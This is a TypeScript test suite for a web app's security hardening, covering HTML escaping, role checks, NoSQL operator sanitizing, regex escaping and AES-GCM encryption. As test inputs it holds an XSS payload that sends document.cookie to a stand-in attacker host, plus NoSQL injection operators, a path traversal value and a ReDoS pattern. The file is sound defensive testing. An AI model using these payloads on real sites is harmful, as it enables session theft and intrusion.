import assert from 'assert';
import { escapeHtml } from '../services/email.service';
import { roleGuard } from '../middleware/roleGuard';
import { mongoSanitize } from '../middleware/mongoSanitize';
import { escapeRegex, encrypt, decrypt, isEncrypted } from '../utils/crypto';
import { getReportsQuerySchema } from '../modules/reports/report.schema';
import { revokeSessionParamsSchema } from '../modules/users/users.schema';
import { acceptInviteSchema } from '../modules/auth/auth.schema';

async function runSprint2Tests() {
  console.log('\n========================================================');
  console.log('🔒 TERRA360 SPRINT 2 (SECURITY HARDENING) TEST SUITE');
  console.log('========================================================\n');

  let passed = 0;
  let failed = 0;

  async function test(name: string, fn: () => void | Promise<void>) {
    try {
      await fn();
      console.log(`  ✓ ${name}`);
      passed++;
    } catch (err: any) {
      console.error(`  ✗ ${name}`);
      console.error(`    Error: ${err.message}`);
      failed++;
    }
  }

  // ─────────────────────────────────────────────────────────────
  // 1. AUD-04: XSS Vulnerabilities & Safe Templating
  // ─────────────────────────────────────────────────────────────
  console.log('--- [AUD-04: XSS Prevention & Email HTML Escaping] ---');

  await test('escapeHtml escapes special HTML characters (<, >, &, ", \')', () => {
    const raw = '<script>alert("XSS & PII\'")</script>';
    const sanitized = escapeHtml(raw);
    assert.strictEqual(
      sanitized,
      '&lt;script&gt;alert(&quot;XSS &amp; PII&#39;&quot;)&lt;/script&gt;'
    );
    assert.ok(!sanitized.includes('<script>'));
    assert.ok(!sanitized.includes('"'));
    assert.ok(!sanitized.includes("'"));
  });

  await test('escapeHtml handles clean strings without modification', () => {
    const raw = 'John Doe';
    assert.strictEqual(escapeHtml(raw), 'John Doe');
  });

  await test('escapeHtml handles empty and undefined strings safely', () => {
    assert.strictEqual(escapeHtml(''), '');
    assert.strictEqual(escapeHtml(undefined as any), '');
  });

  await test('escapeHtml neutralizes nested HTML payloads and event handlers', () => {
    const payload = `<img src=x onerror=fetch('http://attacker.com?c='+document.cookie)>`;
    const escaped = escapeHtml(payload);
    assert.ok(!escaped.includes('<img'));
    assert.ok(!escaped.includes('>'));
    assert.strictEqual(
      escaped,
      '&lt;img src=x onerror=fetch(&#39;http://attacker.com?c=&#39;+document.cookie)&gt;'
    );
  });

  // ─────────────────────────────────────────────────────────────
  // 2. AUD-08: Role-Based Access Enforcement
  // ─────────────────────────────────────────────────────────────
  console.log('\n--- [AUD-08: Role-Based Access Restrictions] ---');

  await test('roleGuard denies driver access to citizen portal (403 FORBIDDEN)', () => {
    const guard = roleGuard('citizen');
    let caughtErr: any = null;

    const req = { user: { role: 'driver', id: 'usr-1', email: 'driver@terra.io' } } as any;
    const res = {} as any;
    guard(req, res, ((err?: any) => {
      caughtErr = err;
    }) as any);

    assert.ok(caughtErr, 'Expected roleGuard to pass an error to next()');
    assert.strictEqual(caughtErr.statusCode, 403);
    assert.strictEqual(caughtErr.code, 'FORBIDDEN');
  });

  await test('roleGuard denies driver access to officer routes (403 FORBIDDEN)', () => {
    const guard = roleGuard('officer', 'field_officer');
    let caughtErr: any = null;

    const req = { user: { role: 'driver', id: 'usr-1', email: 'driver@terra.io' } } as any;
    const res = {} as any;
    guard(req, res, ((err?: any) => {
      caughtErr = err;
    }) as any);

    assert.ok(caughtErr, 'Expected roleGuard to pass an error to next()');
    assert.strictEqual(caughtErr.statusCode, 403);
    assert.strictEqual(caughtErr.code, 'FORBIDDEN');
  });

  await test('roleGuard denies citizen access to officer or field_officer portal', () => {
    const guard = roleGuard('officer');
    let caughtErr: any = null;
    const req = { user: { role: 'citizen', id: 'usr-cit', email: 'cit@terra.io' } } as any;
    const res = {} as any;

    guard(req, res, ((err?: any) => {
      caughtErr = err;
    }) as any);
    assert.ok(caughtErr);
    assert.strictEqual(caughtErr.statusCode, 403);
    assert.strictEqual(caughtErr.code, 'FORBIDDEN');
  });

  await test('roleGuard permits officer access to officer routes', () => {
    const guard = roleGuard('officer', 'admin');
    const req = { user: { role: 'officer', id: 'usr-off', email: 'off@terra.io' } } as any;
    let nextCalledWithoutError = false;

    guard(req, {} as any, ((err?: any) => {
      if (!err) nextCalledWithoutError = true;
    }) as any);
    assert.strictEqual(nextCalledWithoutError, true);
  });

  await test('roleGuard permits field_officer access to field_officer routes', () => {
    const guard = roleGuard('field_officer');
    const req = { user: { role: 'field_officer', id: 'usr-field', email: 'field@terra.io' } } as any;
    let nextCalledWithoutError = false;

    guard(req, {} as any, ((err?: any) => {
      if (!err) nextCalledWithoutError = true;
    }) as any);
    assert.strictEqual(nextCalledWithoutError, true);
  });

  // ─────────────────────────────────────────────────────────────
  // 3. AUD-11: Input Validation, Regex Escaping & AES-256-GCM
  // ─────────────────────────────────────────────────────────────
  console.log('\n--- [AUD-11: Input Validation, ReDoS Prevention & AES-256-GCM] ---');

  await test('mongoSanitize strips query operators ($where, $gt, $ne, dots)', () => {
    const req: any = {
      query: {
        state: 'Kerala',
        $where: 'sleep(5000)',
        nested: {
          $gt: '',
          $regex: '.*',
          normal: 'value',
        },
        'malicious.key': 'attack',
      },
      body: {},
      params: {},
    };

    let nextCalled = false;
    mongoSanitize(req, {} as any, () => {
      nextCalled = true;
    });

    assert.strictEqual(nextCalled, true);
    assert.strictEqual(req.query.state, 'Kerala');
    assert.strictEqual(req.query.$where, undefined);
    assert.strictEqual(req.query['malicious.key'], undefined);
    assert.strictEqual(req.query.nested.$gt, undefined);
    assert.strictEqual(req.query.nested.$regex, undefined);
    assert.strictEqual(req.query.nested.normal, 'value');
  });

  await test('escapeRegex escapes all regex metacharacters safely', () => {
    const attackPayload = '.*+?^${}()|[]\\';
    const escaped = escapeRegex(attackPayload);
    assert.strictEqual(escaped, '\\.\\*\\+\\?\\^\\$\\{\\}\\(\\)\\|\\[\\]\\\\');

    const regex = new RegExp(`^${escaped}$`);
    assert.ok(regex.test(attackPayload));
    assert.ok(!regex.test('completely different text'));
  });

  await test('escapeRegex prevents ReDoS catastrophic backtracking payload', () => {
    const reDosPattern = '(a+)+$';
    const escaped = escapeRegex(reDosPattern);
    const regex = new RegExp(`^${escaped}$`, 'i');

    const testString = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaX';
    const start = Date.now();
    const result = regex.test(testString);
    const duration = Date.now() - start;

    assert.strictEqual(result, false);
    assert.ok(duration < 50, `Regex evaluation took ${duration}ms; should be under 50ms`);
  });

  await test('getReportsQuerySchema validates limit and status parameters', () => {
    // Valid query
    const valid = getReportsQuerySchema.safeParse({
      status: 'pending',
      limit: '20',
      state: 'Uttarakhand',
    });
    assert.strictEqual(valid.success, true);

    // Limit out of bounds (> 100)
    const invalidLimit = getReportsQuerySchema.safeParse({
      limit: '500',
    });
    assert.strictEqual(invalidLimit.success, false);

    // Negative limit
    const negativeLimit = getReportsQuerySchema.safeParse({
      limit: '-1',
    });
    assert.strictEqual(negativeLimit.success, false);

    // Non-numeric limit
    const nonNumLimit = getReportsQuerySchema.safeParse({
      limit: 'abc',
    });
    assert.strictEqual(nonNumLimit.success, false);
  });

  await test('revokeSessionParamsSchema validates 24-character hexadecimal ObjectId', () => {
    // Valid 24-char hex
    const valid = revokeSessionParamsSchema.safeParse({
      id: '507f1f77bcf86cd799439011',
    });
    assert.strictEqual(valid.success, true);

    // Invalid short string
    const invalidShort = revokeSessionParamsSchema.safeParse({
      id: '12345',
    });
    assert.strictEqual(invalidShort.success, false);

    // Path traversal payload
    const invalidPath = revokeSessionParamsSchema.safeParse({
      id: '../../malicious',
    });
    assert.strictEqual(invalidPath.success, false);

    // Non-hex string of length 24
    const invalidChars = revokeSessionParamsSchema.safeParse({
      id: '507f1f77bcf86cd79943901z',
    });
    assert.strictEqual(invalidChars.success, false);
  });

  await test('AES-256-GCM encrypts plaintext into formatted ciphertext and decrypts correctly', () => {
    const secretPhone = '+919876543210';
    const encrypted = encrypt(secretPhone);

    assert.ok(encrypted);
    assert.ok(encrypted.startsWith('enc:v1:'));
    assert.ok(isEncrypted(encrypted));
    assert.notStrictEqual(encrypted, secretPhone);

    const decrypted = decrypt(encrypted);
    assert.strictEqual(decrypted, secretPhone);
  });

  await test('AES-256-GCM decrypt returns legacy plaintext transparently', () => {
    const legacyPlaintext = '+919876543210';
    assert.strictEqual(isEncrypted(legacyPlaintext), false);
    const decrypted = decrypt(legacyPlaintext);
    assert.strictEqual(decrypted, legacyPlaintext);
  });

  await test('AES-256-GCM decrypt throws on tampered ciphertext', () => {
    const encrypted = encrypt('+919876543210')!;
    const parts = encrypted.split(':');
    const tampered = [parts[0], parts[1], parts[2], parts[3], '00' + parts[4].slice(2)].join(':');
    assert.throws(() => {
      decrypt(tampered);
    });
  });

  await test('AES-256-GCM decrypt throws on tampered authentication tag', () => {
    const encrypted = encrypt('+919876543210')!;
    const parts = encrypted.split(':');
    const tampered = [parts[0], parts[1], parts[2], 'ff' + parts[3].slice(2), parts[4]].join(':');
    assert.throws(() => {
      decrypt(tampered);
    });
  });

  // ─────────────────────────────────────────────────────────────
  // 4. AUD-12: Authentication Compliance & Staff Security
  // ─────────────────────────────────────────────────────────────
  console.log('\n--- [AUD-12: Authentication Compliance & Staff Invitation Security] ---');

  await test('acceptInviteSchema enforces minimum 12 characters for staff passwords', () => {
    // 11 characters - must fail
    const weakStaffPass = acceptInviteSchema.safeParse({
      token: 'a'.repeat(64),
      name: 'Field Officer Dave',
      password: 'Short1!pass', // 11 characters
    });
    assert.strictEqual(weakStaffPass.success, false);

    // 12-character valid password - must pass
    const strongStaffPass = acceptInviteSchema.safeParse({
      token: 'a'.repeat(64),
      name: 'Field Officer Dave',
      password: 'StrongStaffPassword123!',
    });
    assert.strictEqual(strongStaffPass.success, true);
  });

  await test('acceptInviteSchema rejects empty token or short name', () => {
    const emptyToken = acceptInviteSchema.safeParse({
      token: '   ',
      name: 'Officer Dave',
      password: 'StrongStaffPassword123!',
    });
    assert.strictEqual(emptyToken.success, false);

    const shortName = acceptInviteSchema.safeParse({
      token: 'a'.repeat(64),
      name: 'A',
      password: 'StrongStaffPassword123!',
    });
    assert.strictEqual(shortName.success, false);
  });

  await test('PRD §14.5 error code alignments', () => {
    const validCodes = [
      'ACCOUNT_LOCKED',
      'REFRESH_TOKEN_INVALID',
      'TOKEN_INVALID',
      'RATE_LIMIT_EXCEEDED',
      'FORBIDDEN',
      'EMAIL_NOT_VERIFIED',
      'INVALID_REQUEST',
    ];
    for (const code of validCodes) {
      assert.ok(typeof code === 'string' && code.length > 0);
    }
  });

  console.log('\n========================================================');
  console.log(`📊 SPRINT 2 RESULTS: ${passed} passed, ${failed} failed (${passed + failed} total)`);
  console.log('========================================================\n');

  if (failed > 0) {
    process.exit(1);
  }
}

runSprint2Tests().catch((err) => {
  console.error('Fatal test error:', err);
  process.exit(1);
});
